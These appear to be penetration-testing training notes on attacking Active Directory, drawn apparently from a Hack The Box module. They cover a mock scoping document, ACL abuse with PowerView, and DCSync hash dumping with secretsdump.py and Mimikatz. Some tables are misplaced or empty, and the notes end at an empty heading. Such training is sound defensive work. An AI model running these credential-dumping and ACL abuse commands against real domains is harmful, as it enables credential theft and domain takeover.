## Active Directory Explained

`Active Directory` (`AD`) is a directory  service for Windows enterprise environments that was officially  implemented in 2000 with the release of Windows Server 2000 and has been incrementally improved upon with the release of each subsequent server  OS since. AD is based on the protocols x.500 and LDAP that came before  it and still utilizes these protocols in some form today. It is a  distributed, hierarchical structure that allows for centralized  management of an organizationâ€™s resources, including users, computers,  groups, network devices and file shares, group policies, devices, and  trusts. AD provides `authentication, accounting, and authorization` functions within a Windows enterprise environment. If this is your  first time learning about Active Directory or hearing these terms, check out the [Intro To Active Directory](https://academy.hackthebox.com/catalogue) module for a more in-depth look at the structure and function of AD, AD objects, etc.

## Why Should We Care About AD?

At the time of writing this module, Microsoft Active Directory holds around `43%` of the [market share](https://www.slintel.com/tech/identity-and-access-management/microsoft-active-directory-market-share#faqs) for enterprise organizations utilizing `Identity and Access management` solutions. This is a huge portion of the market, and it isn't likely to go anywhere any time soon since Microsoft is improving and blending  implementations with Azure AD. Another interesting stat to consider is  that just in the last two years, Microsoft has had over `2000` reported vulnerabilities tied to a [CVE](https://www.cvedetails.com/vendor/26/Microsoft.html). AD's many services and main purpose of making information easy to find  and access make it a bit of a behemoth to manage and correctly harden.  This exposes enterprises to vulnerabilities and exploitation from simple misconfigurations of services and permissions. Tie these  misconfigurations and ease of access with common user and OS  vulnerabilities, and you have a perfect storm for an attacker to take  advantage of. With all of this in mind, this module will explore some of these common issues and show us how to identify, enumerate, and take  advantage of their existence. We will practice enumerating AD utilizing  native tools and languages such as `Sysinternals`, `WMI`, `DNS`, and many others. Some attacks we will also practice include `Password spraying`, `Kerberoasting`, utilizing tools such as `Responder`, `Kerbrute`, `Bloodhound`, and much more.

We may often find ourselves in a network with no clear path to a  foothold through a remote exploit such as a vulnerable application or  service. Yet, we are within an Active Directory environment, which can  lead to a foothold in many ways. The general goal of gaining a foothold  in a client's AD environment is to `escalate privileges` by  moving laterally or vertically throughout the network until we  accomplish the intent of the assessment. The goal can vary from client  to client. It may be accessing a specific host, user's email inbox,  database, or just complete domain compromise and looking for every  possible path to Domain Admin level access within the testing period.  Many open-source tools are available to facilitate enumerating and  attacking Active Directory. To be most effective, we must understand how to perform as much of this enumeration manually as possible. More  importantly, we need to understand the "why" behind certain flaws and  misconfigurations. This will make us more effective as attackers and  equip us to give sound recommendations to our clients on the major  issues within their environment, as well as clear and actionable  remediation advice.

We need to be comfortable enumerating and attacking AD from both  Windows and Linux, with a limited toolset or built-in Windows tools,  also known as "`living off the land`." It is common to run  into situations where our tools fail, are being blocked, or we are  conducting an assessment where the client has us work from a `managed workstation` or `VDI instance` instead of the customized Linux or Windows attack host we may have  grown accustomed to. To be effective in all situations, we must be able  to adapt quickly on the fly, understand the many nuances of AD and know  how to access them even when severely limited in our options.

# Tools of the Trade

------

Many of the module sections require tools such as open-source scripts or precompiled binaries. These can be found in the `C:\Tools` directory on the Windows hosts provided in the sections aimed at  attacking from Windows. In sections that focus on attacking AD from  Linux, we provide a Parrot Linux host customized for the target  environment as if you were an anonymous user with an attack host within  the internal network. All necessary tools and scripts are preloaded on  this host (either installed or in the `/opt` directory).  Here is a listing of many of the tools that we will cover in this module:

| Tool                                                         | Description                                                  |

# Scenario

------

We are Penetration Testers working for `CAT-5 Security`.  After a few successful engagements shadowing with the team, the more  senior members want to see how well we can do starting an assessment on  our own. The team lead sent us the following email detailing what we  need to accomplish.

#### Tasking Email

![image](https://academy.hackthebox.com/storage/modules/143/scenario-email.png)

This module will allow us to practice our skills (both prior and  newly minted) with these tasks. The final assessment for this module is  the execution of `two` internal penetration tests against the company Inlanefreight. During these assessments, we will work through  an internal penetration test simulating starting from an external breach position and a second one beginning with an attack box inside the  internal network as clients often request. Completing the skills  assessments signifies the successful completion of the tasks mentioned  in the scoping document and tasking email above. In doing so, we will  demonstrate a firm grasp of many automated and manual AD attack and  enumeration concepts, knowledge of and experience with a wide array of  tools, and the ability to interpret data gathered from an AD environment to make critical decisions to advance the assessment. The content in  this module is meant to cover core enumeration concepts necessary for  anyone to be successful in performing internal penetration tests in  Active Directory environments. We will also cover many of the most  common attack techniques in great depth while working through some more  advanced concepts as a primer for AD-focused material that will be  covered in more advanced modules.

Below you will find a completed scoping document for the engagement  containing all pertinent information provided by the customer.

## Assessment Scope

The following `IPs`, `hosts`, and `domains` defined below make up the scope of the assessment.

#### In Scope For Assessment

| **Range/Domain**                | **Description**                                              |
| ------------------------------- | ------------------------------------------------------------ |
| `INLANEFREIGHT.LOCAL`           | Customer domain to include AD and web services.              |
| `LOGISTICS.INLANEFREIGHT.LOCAL` | Customer subdomain                                           |
| `FREIGHTLOGISTICS.LOCAL`        | Subsidiary company owned by Inlanefreight. External forest trust with INLANEFREIGHT.LOCAL |
| `172.16.5.0/23`                 | In-scope internal subnet.                                    |
|                                 |                                                              |

#### Out Of Scope

- `Any other subdomains of INLANEFREIGHT.LOCAL`
- `Any subdomains of FREIGHTLOGISTICS.LOCAL`
- `Any phishing or social engineering attacks`
- `Any other IPS/domains/subdomains not explicitly mentioned`
- `Any types of attacks against the real-world inlanefreight.com website outside of passive enumeration shown in this module`

------

## Methods Used

The following methods are authorized for assessing Inlanefreight and its systems :

### External Information Gathering (Passive Checks)

External information gathering is authorized to demonstrate the risks associated with information that can be gathered about the company from the internet. To simulate a real-world attack, CAT-5 and its assessors  will conduct external information gathering from an anonymous  perspective on the internet with no information provided in advance  regarding Inlanefreight outside of what is provided within this  document.

Cat-5 will perform passive enumeration to uncover information that  may help with internal testing. Testing will employ various degrees of  information gathering from open-source resources to identify publicly  accessible data that may pose a risk to Inlanefreight and assist with  the internal penetration test. No active enumeration, port scans, or  attacks will be performed against internet-facing "real-world" IP  addresses or the website located at `https://www.inlanefreight.com`.

### Internal Testing

The internal assessment portion is designed to demonstrate the risks  associated with vulnerabilities on internal hosts and services ( `Active Directory specifically`) by attempting to emulate attack vectors from within Inlanefreight's  area of operations. The result will allow Inlanefreight to assess the  risks of internal vulnerabilities and the potential impact of a  successfully exploited vulnerability.

To simulate a real-world attack, Cat-5 will conduct the assessment  from an untrusted insider perspective with no advance information  outside of what's provided in this documentation and discovered from  external testing. Testing will start from an anonymous position on the  internal network with the goal of obtaining domain user credentials,  enumerating the internal domain, gaining a foothold, and moving  laterally and vertically to achieve compromise of all in-scope internal  domains. Computer systems and network operations will not be  intentionally interrupted during the test.

### Password Testing

Password files captured from Inlanefreight devices, or provided by  the organization, may be loaded onto offline workstations for decryption and utilized to gain further access and accomplish the assessment  goals. At no time will a captured password file or the decrypted  passwords be revealed to persons not officially participating in the  assessment. All data will be stored securely on Cat-5 owned and approved systems and retained for a period of time defined in the official  contract between Cat-5 and Inlanefreight.

------

We provided the above scoping documentation so  we become used to seeing this style of documentation. As we progress  through our Infosec Careers, especially on the offensive side, it will  be common to receive scoping documents and Rules of Engagement (RoE)  documents that outline these types of information.

| `hostname`                                              | Prints the PC's Name                                         |
| `[System.Environment]::OSVersion.Version`               | Prints out the OS version and revision level                 |
| `wmic qfe get Caption,Description,HotFixID,InstalledOn` | Prints the patches and hotfixes applied to the host          |
| `ipconfig /all`                                         | Prints out network adapter state and configurations          |
| `set`                                                   | Displays a list of environment variables for the current session (ran from CMD-prompt) |
| `echo %USERDOMAIN%`                                     | Displays the domain name to which the host belongs (ran from CMD-prompt) |

## Access Control List (ACL) Abuse Primer

### Access Control List (ACL) Overview

In their simplest form, ACLs are lists that define a) who has access  to which asset/resource and b) the level of access they are provisioned. The settings themselves in an ACL are called `Access Control Entries` (`ACEs`). Each ACE maps back to a user, group, or process (also known as security principals) and defines the rights granted to that principal. Every  object has an ACL, but can have multiple ACEs because multiple security  principals can access objects in AD. ACLs can also be used for auditing  access within AD.

There are two types of ACLs:

1. `Discretionary Access Control List` (`DACL`) -  defines which security principals are granted or denied access to an  object. DACLs are made up of ACEs that either allow or deny access. When someone attempts to access an object, the system will check the DACL  for the level of access that is permitted. If a DACL does not exist for  an object, all who attempt to access the object are granted full rights. If a DACL exists, but does not have any ACE entries specifying specific security settings, the system will deny access to all users, groups, or processes attempting to access it.
2. `System Access Control Lists` (`SACL`) - allow administrators to log access attempts made to secured objects.

### Access Control Entries (ACEs)

As stated previously, Access Control Lists (ACLs) contain ACE entries that name a user or group and the level of access they have over a  given securable object. There are `three` main types of ACEs that can be applied to all securable objects in AD:

| **ACE**              | **Description**                                              |
| -------------------- | ------------------------------------------------------------ |
| `Access denied ACE`  | Used within a DACL to show that a user or group is explicitly denied access to an object |
| `Access allowed ACE` | Used within a DACL to show that a user or group is explicitly granted access to an object |
| `System audit ACE`   | Used within a SACL to generate audit logs when a user or group  attempts to access an object. It records whether access was granted or  not and what type of access occurred |

Each ACE is made up of the following `four` components:

1. The security identifier (SID) of the user/group that has access to the object (or principal name graphically)
2. A flag denoting the type of ACE (access denied, allowed, or system audit ACE)
3. A set of flags that specify whether or not child containers/objects  can inherit the given ACE entry from the primary or parent object
4. An [access mask](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dtyp/7a53f60e-e730-4dfe-bbe9-b21b62eb790b?redirectedfrom=MSDN) which is a 32-bit value that defines the rights granted to an object

### Why are ACEs Important?

Attackers utilize ACE entries to either further access or establish  persistence. These can be great for us as penetration testers as many  organizations are unaware of the ACEs applied to each object or the  impact that these can have if applied incorrectly. They cannot be  detected by vulnerability scanning tools, and often go unchecked for  many years, especially in large and complex environments. During an  assessment where the client has taken care of all of the "low hanging  fruit" AD flaws/misconfigurations, ACL abuse can be a great way for us  to move laterally/vertically and even achieve full domain compromise.  Some example Active Directory object security permissions are as  follows. These can be enumerated (and visualized) using a tool such as  BloodHound, and are all abusable with PowerView, among other tools:

- `ForceChangePassword` abused with `Set-DomainUserPassword`
- `Add Members` abused with `Add-DomainGroupMember`
- `GenericAll` abused with `Set-DomainUserPassword` or `Add-DomainGroupMember`
- `GenericWrite` abused with `Set-DomainObject`
- `WriteOwner` abused with `Set-DomainObjectOwner`
- `WriteDACL` abused with `Add-DomainObjectACL`
- `AllExtendedRights` abused with `Set-DomainUserPassword` or `Add-DomainGroupMember`
- `Addself` abused with `Add-DomainGroupMember`

In this module, we will cover enumerating and leveraging four specific ACEs to highlight the power of ACL attacks:

- [ForceChangePassword](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#forcechangepassword) - gives us the right to reset a user's password without first knowing  their password (should be used cautiously and typically best to consult  our client before resetting passwords).
- [GenericWrite](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#genericwrite) - gives us the right to write to any non-protected attribute on an  object. If we have this access over a user, we could assign them an SPN  and perform a Kerberoasting attack (which relies on the target account  having a weak password set). Over a group means we could add ourselves  or another security principal to a given group. Finally, if we have this access over a computer object, we could perform a resource-based  constrained delegation attack which is outside the scope of this module.
- `AddSelf` - shows security groups that a user can add themselves to.
- [GenericAll](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#genericall) - this grants us full control over a target object. Again, depending on if this is granted over a user or group, we could modify group  membership, force change a password, or perform a targeted Kerberoasting attack. If we have this access over a computer object and the [Local Administrator Password Solution (LAPS)](https://www.microsoft.com/en-us/download/details.aspx?id=46899) is in use in the environment, we can read the LAPS password and gain  local admin access to the machine which may aid us in lateral movement  or privilege escalation in the domain if we can obtain privileged  controls or gain some sort of privileged access.

## ACL Enumeration

**Tools:**

- PowerView
- Bloodhound

**Commands:**

Find-InterestingDomainAcl - Enumerate ALL ACLs (extremely time-consuming and likely inaccurate):

```powershell
PS C:\> Find-InterestingDomainAcl
```

Get-DomainObjectACL - Enumerate a specific object and retrieve GUID value from "ObjectAceType" (GUID):

```powershell
PS C:\> Import-Module .\PowerView.ps1
PS C:\> $sid = Convert-NameToSid {OBJECT}
PS C:\> Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}

Example:

PS C:\htb> Import-Module .\PowerView.ps1
PS C:\htb> $sid = Convert-NameToSid wley
PS C:\htb> Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}

ObjectDN               : CN=Dana Amundsen,OU=DevOps,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
ObjectSID              : S-1-5-21-3842939050-3880317879-2865463114-1176
ActiveDirectoryRights  : ExtendedRight
ObjectAceFlags         : ObjectAceTypePresent
ObjectAceType          : 00299570-246d-11d0-a768-00aa006e0529
InheritedObjectAceType : 00000000-0000-0000-0000-000000000000
BinaryLength           : 56
AceQualifier           : AccessAllowed
IsCallback             : False
OpaqueLength           : 0
AccessMask             : 256
SecurityIdentifier     : S-1-5-21-3842939050-3880317879-2865463114-1181
AceType                : AccessAllowedObject
AceFlags               : ContainerInherit
IsInherited            : False
InheritanceFlags       : ContainerInherit
PropagationFlags       : None
AuditFlags             : None
```

**NOTE:** In the example above, the GUID is "00299570-246d-11d0-a768-00aa006e0529". With the GUID, we can search the value on google or perform a reverse search using the command below.

Performing a Reverse Search & Mapping to a GUID Value:

```powershell
PS C:\htb> $guid= "{GUID}"
PS C:\htb> Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * |Select Name,DisplayName,DistinguishedName,rightsGuid| ?{$_.rightsGuid -eq $guid} | fl

Example:

PS C:\htb> $guid= "00299570-246d-11d0-a768-00aa006e0529"
PS C:\htb> Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * |Select Name,DisplayName,DistinguishedName,rightsGuid| ?{$_.rightsGuid -eq $guid} | fl

Name              : User-Force-Change-Password
DisplayName       : Reset Password
DistinguishedName : CN=User-Force-Change-Password,CN=Extended-Rights,CN=Configuration,DC=INLANEFREIGHT,DC=LOCAL
rightsGuid        : 00299570-246d-11d0-a768-00aa006e0529
```

Get-DomainObjectACL - Enumerate a specific object and retrieve GUID value from "ObjectAceType" (Human-Readable):

```powershell
PS C:\> Import-Module .\PowerView.ps1
PS C:\> $sid = Convert-NameToSid {OBJECT}
PS C:\> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid} 

Example:

PS C:\htb> Import-Module .\PowerView.ps1
PS C:\htb> $sid = Convert-NameToSid wley
PS C:\htb> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid} 

AceQualifier           : AccessAllowed
ObjectDN               : CN=Dana Amundsen,OU=DevOps,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights  : ExtendedRight
ObjectAceType          : User-Force-Change-Password
ObjectSID              : S-1-5-21-3842939050-3880317879-2865463114-1176
InheritanceFlags       : ContainerInherit
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-3842939050-3880317879-2865463114-1181
AccessMask             : 256
AuditFlags             : None
IsInherited            : False
AceFlags               : ContainerInherit
InheritedObjectAceType : All
OpaqueLength           : 0
```

## ACL Abuse Tactics

**Tools:**

- [PSCredential object](https://docs.microsoft.com/en-us/dotnet/api/system.management.automation.pscredential?view=powershellsdk-7.0.0)
- [pth-toolkit](https://github.com/byt3bl33d3r/pth-toolkit)
- [targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast)

**Commands:**

 [PSCredential object](https://docs.microsoft.com/en-us/dotnet/api/system.management.automation.pscredential?view=powershellsdk-7.0.0) - opening a PowerShell console and authenticating as another user:

```powershell
PS C:\> $SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force
PS C:\> $Cred = New-Object System.Management.Automation.PSCredential('{DOMAIN}\{USER}', $SecPassword) 
```

## DCSync

**Tools:**

- secretsdump.py
- Mimikatz
- Invoke-DCSync

**Commands:**

secretsdump.py:

```bash
secretsdump.py -outputfile FILE.TXT -just-dc '{DOMAIN}/{USER}:{PASS}@{IP}'
```

**NOTE:** The `-just-dc` flag tells the tool to extract NTLM hashes and Kerberos keys from the NTDS file.

Mimikatz:

```powershell
PS C:\> .\mimikatz.exe
mimikatz # privilege::debug
mimikatz # lsadump::dcsync /domain:{DOMAIN}
```

Mimikatz - Specify user:

```powershell
PS C:\> .\mimikatz.exe
mimikatz # privilege::debug
mimikatz # lsadump::dcsync /domain:{DOMAIN} /user:{USER}
```

# Stacking The Deck

## Privileged Access

Once we gain a foothold in the domain, our goal shifts to advancing  our position further by moving laterally or vertically to obtain access  to other hosts, and eventually achieve domain compromise or some other  goal, depending on the aim of the assessment. To achieve this, there are several ways we can move laterally. Typically, if we take over an  account with local admin rights over a host, or set of hosts, we can  perform a `Pass-the-Hash` attack to authenticate via the SMB protocol.

**But what if we don't yet have local admin rights on any hosts in the domain?**

There are several other ways we can move around a Windows domain:

- `Remote Desktop Protocol` (`RDP`) - is a remote access/management protocol that gives us GUI access to a target host
- [PowerShell Remoting](https://docs.microsoft.com/en-us/powershell/scripting/learn/ps101/08-powershell-remoting?view=powershell-7.2) - also referred to as PSRemoting or Windows Remote Management (WinRM)  access, is a remote access protocol that allows us to run commands or  enter an interactive command-line session on a remote host using  PowerShell
- `MSSQL Server` - an account with sysadmin privileges on an SQL Server instance can log into the instance remotely and execute  queries against the database. This access can be used to run operating  system commands in the context of the SQL Server service account through various methods

We can enumerate this access in various ways. The easiest, once  again, is via BloodHound, as the following edges exist to show us what  types of remote access privileges a given user has:

- [CanRDP](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#canrdp)
- [CanPSRemote](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#canpsremote)
- [SQLAdmin](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#sqladmin)

We can also enumerate these privileges using tools such as PowerView and even built-in tools.

**Tools:**

- mssqlclient.py
- evil-winrm
- PowerUpSQL.ps1

**Commands:**
